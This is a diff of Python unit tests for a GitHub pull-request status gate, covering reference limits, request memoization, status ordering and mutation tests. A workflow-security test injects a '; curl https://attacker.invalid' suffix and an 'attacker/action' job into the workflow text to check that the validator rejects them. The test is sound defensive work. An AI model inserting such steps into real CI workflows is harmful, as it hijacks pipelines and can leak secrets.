@@ -45,6 +45,7 @@ def managed_body(
     draft: bool = False,
     head_sha: str = HEAD_SHA,
     history: list[dict[str, object]] | None = None,
+    references: list[str] | None = None,
 ) -> str:
     """Return one phase-1-valid body for the supplied trusted facts."""
     payload = {
@@ -69,7 +70,11 @@ def managed_body(
             },
         ],
         "references": {
-            "non_closing": ["Refs #4801", "Part of #4796"],
+            "non_closing": (
+                ["Refs #4801", "Part of #4796"]
+                if references is None
+                else references
+            ),
             "closing": [],
         },
         "history_claims": history or [],
@@ -127,6 +132,7 @@ class FakeTransport:
         self.pr_reads = 0
         self.gets: list[str] = []
         self.posts: list[tuple[str, dict[str, object]]] = []
+        self.events: list[tuple[str, str]] = []
         self.fail_get: dict[str, Exception] = {}
         self.fail_post_at: set[int] = set()
         self.file_overrides: dict[int, list[dict[str, str]]] = {}
@@ -141,6 +147,7 @@ class FakeTransport:
     def get(self, path: str, *, allow_not_found: bool = False) -> object:
         """Return one scripted response."""
         self.gets.append(path)
+        self.events.append(("get", path))
         if path in self.fail_get:
             raise self.fail_get[path]
         pr_match = re.fullmatch(r"/repos/phasetr/ising-model/pulls/([1-9][0-9]*)", path)
@@ -244,6 +251,7 @@ class FakeTransport:
 
     def post(self, path: str, payload: dict[str, object]) -> object:
         """Record one status write."""
+        self.events.append(("post", path))
         position = len(self.posts)
         if position in self.fail_post_at:
             raise live.LiveGateError("STATUS_WRITE_FAILED")
@@ -556,6 +564,59 @@ class PaginationTest(unittest.TestCase):
 
 
 class ContextDerivationTest(unittest.TestCase):
+    def test_structured_reference_total_and_uniqueness_are_bounded(self) -> None:
+        paths = ["scripts/example.py"]
+        expected_maximum = 16
+        actual_maximum = getattr(live, "MAX_STRUCTURED_REFERENCES", None)
+        maximum = [
+            f"Refs #{5000 + index}"
+            for index in range(expected_maximum)
+        ]
+        payload = live.structured_payload(
+            managed_body(paths, references=maximum)
+        )
+        self.assertEqual(
+            len(live.structured_references(payload)),
+            expected_maximum,
+        )
+        for references in [
+            maximum + ["Refs #9999"],
+            ["Refs #4801", "Refs #4801"],
+            ["Refs #4801", "Part of #4801"],
+            ["Part of #4796"],
+        ]:
+            with self.subTest(references=references[-2:]):
+                payload = live.structured_payload(
+                    managed_body(paths, references=references)
+                )
+                with self.assertRaises(live.LiveGateError):
+                    live.structured_references(payload)
+        self.assertEqual(actual_maximum, expected_maximum)
+
+    def test_shared_issue_chains_are_memoized_with_bounded_requests(self) -> None:
+        paths = ["scripts/example.py"]
+        body = managed_body(
+            paths,
+            references=["Refs #4801", "Refs #4802", "Part of #4796"],
+        )
+        transport = FakeTransport(
+            [pr_data(paths, body=body)],
+            paths,
+            parents={4801: 4796, 4802: 4796, 4796: None},
+        )
+        self.assertEqual(
+            live.derive_allowed_issue_refs(transport, REPOSITORY, body),
+            [4796, 4801, 4802],
+        )
+        issue_requests = [
+            path for path in transport.gets if "/issues/" in path
+        ]
+        self.assertEqual(len(issue_requests), len(set(issue_requests)))
+        self.assertLessEqual(
+            len(issue_requests),
+            live.MAX_STRUCTURED_REFERENCES + live.MAX_ISSUES,
+        )
+
     def test_issue_hierarchy_is_structural_and_bounded(self) -> None:
         paths = ["scripts/example.py"]
         body = managed_body(paths)
@@ -828,6 +889,69 @@ class EvaluationTest(unittest.TestCase):
                 (endpoint, live.status_payload("success", "PASS")),
             ],
         )
+        first_file_get = next(
+            index
+            for index, event in enumerate(transport.events)
+            if "/files?" in event[1]
+        )
+        pending_post = transport.events.index(
+            ("post", f"/repos/{REPOSITORY}/statuses/{HEAD_SHA}")
+        )
+        self.assertLess(pending_post, first_file_get)
+
+    def test_thousand_duplicate_refs_fail_before_fact_gets_after_pending(self) -> None:
+        body = managed_body(
+            self.paths,
+            references=["Refs #4801"] * 1000,
+        )
+        pr = pr_data(self.paths, body=body)
+        transport = FakeTransport([pr], self.paths)
+        self.assertEqual(
+            live.evaluate_pr(transport, REPOSITORY, 4805, checker(0)),
+            1,
+        )
+        self.assertFalse(
+            any("/issues/" in path or "/files?" in path for path in transport.gets)
+        )
+        self.assertEqual(
+            [payload["state"] for _, payload in transport.posts],
+            ["pending", "failure"],
+        )
+
+    def test_pending_failure_stops_and_later_network_errors_finalize(self) -> None:
+        transport = FakeTransport([self.pr], self.paths)
+        transport.fail_post_at.add(0)
+        self.assertEqual(
+            live.evaluate_pr(transport, REPOSITORY, 4805, checker(0)),
+            1,
+        )
+        self.assertEqual(
+            [event for event in transport.events if event[0] == "post"],
+            [("post", f"/repos/{REPOSITORY}/statuses/{HEAD_SHA}")],
+        )
+        self.assertFalse(any("/files?" in path for path in transport.gets))
+
+        for error_code in ["API_RATE_LIMIT", "API_TIMEOUT"]:
+            with self.subTest(error_code=error_code):
+                transport = FakeTransport([self.pr], self.paths)
+                files = (
+                    f"/repos/{REPOSITORY}/pulls/4805/files"
+                    "?per_page=100&page=1"
+                )
+                transport.fail_get[files] = live.LiveGateError(error_code)
+                self.assertEqual(
+                    live.evaluate_pr(
+                        transport,
+                        REPOSITORY,
+                        4805,
+                        checker(0),
+                    ),
+                    1,
+                )
+                self.assertEqual(
+                    [payload["state"] for _, payload in transport.posts],
+                    ["pending", "failure"],
+                )
 
     def test_real_offline_ready_passes_and_draft_incomplete_fails(self) -> None:
         ready_transport = FakeTransport([self.pr, self.pr], self.paths)
@@ -937,24 +1061,28 @@ class EvaluationTest(unittest.TestCase):
         closed = pr_data(self.paths, state="closed")
         transport = FakeTransport([closed], self.paths)
         self.assertEqual(live.evaluate_pr(transport, REPOSITORY, 4805, checker(0)), 1)
-        self.assertEqual(transport.posts[-1][1]["state"], "failure")
+        self.assertEqual(transport.posts, [])
         non_main = pr_data(self.paths)
         non_main["base"]["ref"] = "release"
         transport = FakeTransport([non_main], self.paths)
         self.assertEqual(live.evaluate_pr(transport, REPOSITORY, 4805, checker(0)), 1)
-        self.assertEqual(transport.posts[-1][1]["state"], "failure")
+        self.assertEqual(transport.posts, [])
         cross_repository = pr_data(self.paths)
         cross_repository["base_repo"]["full_name"] = "other/project"
         transport = FakeTransport([cross_repository], self.paths)
         self.assertEqual(live.evaluate_pr(transport, REPOSITORY, 4805, checker(0)), 1)
-        self.assertEqual(transport.posts[-1][1]["state"], "failure")
+        self.assertEqual(transport.posts, [])
 
     def test_body_context_and_diagnostic_bounds_fail(self) -> None:
         huge_body = "x" * (live.MAX_BODY_BYTES + 1)
         pr = pr_data(self.paths, body=huge_body)
         transport = FakeTransport([pr], self.paths)
         self.assertEqual(live.evaluate_pr(transport, REPOSITORY, 4805, checker(0)), 1)
-        self.assertEqual(transport.posts[-1][1]["state"], "failure")
+        self.assertEqual(
+            [payload["state"] for _, payload in transport.posts],
+            ["pending", "failure"],
+        )
+        self.assertFalse(any("/files?" in path for path in transport.gets))
         with self.assertRaisesRegex(live.LiveGateError, "DIAGNOSTIC_LIMIT_EXCEEDED"):
             live.sanitize_diagnostic("x" * (live.MAX_DIAGNOSTIC_BYTES + 1))
         large_paths = [
@@ -1087,6 +1215,127 @@ class MutationTest(unittest.TestCase):
         self.assertNotEqual(
             mutant.status_payload("pending", "PENDING")["context"],
             "completion-claim/live",
+        )
+
+    def test_structured_reference_bound_mutant_is_killed(self) -> None:
+        mutant = self.mutant(
+            "MAX_STRUCTURED_REFERENCES = 16",
+            "MAX_STRUCTURED_REFERENCES = 1001",
+        )
+        paths = ["scripts/example.py"]
+        references = [f"Refs #{5000 + index}" for index in range(17)]
+        payload = live.structured_payload(
+            managed_body(paths, references=references)
+        )
+        with self.assertRaisesRegex(
+            live.LiveGateError,
+            "STRUCTURED_REFERENCE_LIMIT_EXCEEDED",
+        ):
+            live.structured_references(payload)
+        self.assertEqual(len(mutant.structured_references(payload)), 17)
+
+    def test_workflow_digest_guard_mutant_is_killed(self) -> None:
+        mutant = self.mutant(
+            "if digest != WORKFLOW_SHA256:",
+            "if False:",
+        )
+        text = WORKFLOW_PATH.read_text(encoding="utf-8")
+        with self.assertRaisesRegex(
+            live.LiveGateError,
+            "WORKFLOW_DIGEST_MISMATCH",
+        ):
+            live.validate_workflow_text(text + "\n")
+        mutant.validate_workflow_text(text + "\n")
+
+    def test_pending_finalizer_mutant_is_killed(self) -> None:
+        mutant = self.mutant(
+            "if head_sha is not None and pending_written:",
+            "if False:",
+        )
+        paths = ["scripts/example.py"]
+        pr = pr_data(paths)
+        files = (
+            f"/repos/{REPOSITORY}/pulls/4805/files"
+            "?per_page=100&page=1"
+        )
+        real_transport = FakeTransport([pr], paths)
+        real_transport.fail_get[files] = live.LiveGateError("API_TIMEOUT")
+        mutant_transport = FakeTransport([pr], paths)
+        mutant_transport.fail_get[files] = live.LiveGateError("API_TIMEOUT")
+        self.assertEqual(
+            live.evaluate_pr(
+                real_transport,
+                REPOSITORY,
+                4805,
+                checker(0),
+            ),
+            1,
+        )
+        self.assertEqual(
+            mutant.evaluate_pr(
+                mutant_transport,
+                REPOSITORY,
+                4805,
+                checker(0),
+            ),
+            1,
+        )
+        self.assertEqual(
+            [payload["state"] for _, payload in real_transport.posts],
+            ["pending", "failure"],
+        )
+        self.assertEqual(
+            [payload["state"] for _, payload in mutant_transport.posts],
+            ["pending"],
+        )
+
+    def test_issue_parent_cache_mutant_is_killed(self) -> None:
+        mutant = self.mutant(
+            "if current not in parent_cache:",
+            "if True:",
+        )
+        paths = ["scripts/example.py"]
+        body = managed_body(
+            paths,
+            references=["Refs #4801", "Refs #4802", "Part of #4796"],
+        )
+        parents = {4801: 4796, 4802: 4796, 4796: None}
+        real_transport = FakeTransport(
+            [pr_data(paths, body=body)],
+            paths,
+            parents=parents,
+        )
+        mutant_transport = FakeTransport(
+            [pr_data(paths, body=body)],
+            paths,
+            parents=parents,
+        )
+        self.assertEqual(
+            live.derive_allowed_issue_refs(
+                real_transport,
+                REPOSITORY,
+                body,
+            ),
+            [4796, 4801, 4802],
+        )
+        self.assertEqual(
+            mutant.derive_allowed_issue_refs(
+                mutant_transport,
+                REPOSITORY,
+                body,
+            ),
+            [4796, 4801, 4802],
+        )
+        real_issue_gets = [
+            path for path in real_transport.gets if "/issues/" in path
+        ]
+        mutant_issue_gets = [
+            path for path in mutant_transport.gets if "/issues/" in path
+        ]
+        self.assertEqual(len(real_issue_gets), len(set(real_issue_gets)))
+        self.assertGreater(
+            len(mutant_issue_gets),
+            len(set(mutant_issue_gets)),
         )
 
     def test_pagination_ceiling_mutant_is_killed(self) -> None:
@@ -1238,6 +1487,29 @@ class WorkflowSecurityTest(unittest.TestCase):
         ]:
             with self.assertRaises(live.LiveGateError):
                 live.validate_workflow_text(mutation)
+
+    def test_exact_steps_reject_curl_suffix_attacker_action_and_whitespace(self) -> None:
+        mutations = [
+            self.text.replace(
+                'select >> "$GITHUB_OUTPUT"',
+                'select >> "$GITHUB_OUTPUT"; curl https://attacker.invalid',
+                1,
+            ),
+            self.text.replace(
+                "run: python3 scripts/completion_claim_live.py process",
+                "run: |\n          python3 scripts/completion_claim_live.py process",
+                1,
+            ),
+            self.text
+            + "\n  attacker:\n    runs-on: ubuntu-latest\n"
+            + "    steps:\n      - uses: attacker/action@"
+            + "0123456789abcdef0123456789abcdef01234567\n",
+            self.text + "\n",
+        ]
+        for mutation in mutations:
+            with self.subTest(mutation=mutation[-80:]):
+                with self.assertRaises(live.LiveGateError):
+                    live.validate_workflow_text(mutation)
 
     def test_all_events_share_one_pr_matrix_concurrency_key(self) -> None:
         expected = (
